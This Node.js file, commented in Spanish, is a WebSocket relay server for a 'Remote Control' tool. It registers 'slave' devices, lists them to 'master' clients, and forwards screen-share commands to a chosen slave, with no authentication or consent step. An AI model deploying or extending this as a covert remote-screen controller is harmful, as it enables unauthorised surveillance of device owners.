const http = require('http');
const WebSocket = require('ws');

// Crear un servidor HTTP
const server = http.createServer((req, res) => {
    res.writeHead(200);
    res.end('🚀 Remote Control v5.0 - Funcional 🚀');
});

// Crear servidor WebSocket
const wss = new WebSocket.Server({ server });

// Mapa para almacenar los dispositivos esclavos y maestros
const devices = {
    slaves: new Map(),
    masters: new Set()
};

// Establecer conexión de WebSocket
wss.on('connection', (ws, req) => {
    const ip = req.socket.remoteAddress;
    console.log(`[+] Conexión desde: ${ip}`);

    ws.on('message', (message) => {
        try {
            const msg = message.toString();
            console.log(`[${ip}] Mensaje: ${msg}`);

            if (msg.startsWith('ESCLAVO-')) {
                // Registrar dispositivo esclavo
                devices.slaves.set(msg, ws);
                console.log(`[SLAVE] ${msg} registrado`);
                broadcastSlaves();  // Notificar a los maestros que hay un esclavo nuevo
            } else if (msg === 'MAESTRO') {
                // Registrar dispositivo maestro
                devices.masters.add(ws);
                console.log(`[MASTER] ${ip} listo`);
                sendSlaveList(ws);  // Enviar la lista INMEDIATAMENTE
            } else if (msg.startsWith('START_SCREENSHARE:')) {
                // Comando para capturar pantalla
                const slaveId = msg.replace('START_SCREENSHARE:', '');
                console.log(`[DEBUG] Comando de captura de pantalla para esclavo ${slaveId}`);
                startScreenShareCommand(slaveId);
            }
        } catch (e) {
            console.error(`[ERROR] ${ip}: ${e.message}`);
        }
    });

    // Manejar desconexión de WebSocket
    ws.on('close', () => {
        // Eliminar esclavo o maestro desconectado
        devices.slaves.forEach((v, k) => { if (v === ws) devices.slaves.delete(k); });
        devices.masters.delete(ws);
        broadcastSlaves();  // Notificar a los maestros sobre la desconexión
        console.log(`[-] ${ip} desconectado`);
    });
});

// Función para enviar lista de esclavos a los maestros
function broadcastSlaves() {
    const slaveList = Array.from(devices.slaves.keys());
    devices.masters.forEach(master => {
        if (master.readyState === WebSocket.OPEN) {
            master.send(JSON.stringify({
                action: "UPDATE",
                slaves: slaveList,
                timestamp: Date.now()
            }));
        }
    });
}

// Función para enviar la lista de esclavos a un maestro específico
function sendSlaveList(ws) {
    if (ws.readyState === WebSocket.OPEN) {
        const slaveList = Array.from(devices.slaves.keys());
        console.log(`[DEBUG] Enviando lista a MASTER: ${slaveList}`);
        ws.send(JSON.stringify({
            action: "INIT",
            slaves: slaveList,
            timestamp: Date.now()
        }));
    }
}

// Función para enviar el comando de captura de pantalla a un esclavo
function startScreenShareCommand(slaveId) {
    console.log(`[DEBUG] Verificando si el esclavo ${slaveId} está registrado...`);
    const slaveSocket = devices.slaves.get(slaveId);
    
    if (!slaveSocket) {
        console.log(`[ERROR] Esclavo con ID ${slaveId} no encontrado.`);
        return;
    }
    
    // Verificamos si el WebSocket está abierto antes de enviar el comando
    if (slaveSocket.readyState !== WebSocket.OPEN) {
        console.log(`[ERROR] El esclavo ${slaveId} no está disponible (estado WebSocket no OPEN).`);
        return;
    }

    console.log(`[DEBUG] Enviando comando START_SCREENSHARE al esclavo ${slaveId}`);
    slaveSocket.send(JSON.stringify({
        action: "START_SCREENSHARE",
        timestamp: Date.now()
    }));
    
    // Confirmar el envío del comando
    console.log(`[COMMAND] Comando START_SCREENSHARE enviado al esclavo ${slaveId}`);
    
    // Esperar respuesta del esclavo (simulación de procesamiento)
    slaveSocket.on('message', (response) => {
        const data = JSON.parse(response);
        if (data.action === 'SCREENSHARE_STARTED') {
            console.log(`[DEBUG] El esclavo ${slaveId} ha comenzado la captura de pantalla.`);
        }
    });
}

// Iniciar servidor HTTP en el puerto especificado
const port = process.env.PORT || 8080;
server.listen(port, () => {
    console.log(`✅ Servidor ACTIVO en puerto: ${port}`);
});
